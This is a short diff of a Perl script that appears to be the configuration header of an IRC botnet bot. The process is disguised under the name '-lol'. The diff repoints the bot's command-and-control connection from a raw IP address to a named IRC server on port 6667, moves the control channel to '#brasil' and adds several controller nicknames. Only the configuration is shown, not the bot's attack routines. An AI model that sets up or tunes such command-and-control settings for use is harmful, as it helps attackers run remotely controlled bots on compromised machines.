@@ -1,9 +1,9 @@
 #!/usr/bin/perl
 my $processo = '-lol';
-$servidor='38.72.132.203' unless $servidor;
+$servidor='irc.servercentral.net' unless $servidor;
 my $porta='6667';
-my @canais=("#cool cool!#");
-my @adms=("del","spy");
+my @canais=("#brasil");
+my @adms=("del","spy","lol","cypher","cypher-");
 
 my $linas_max=6;
 my $sleep=3;
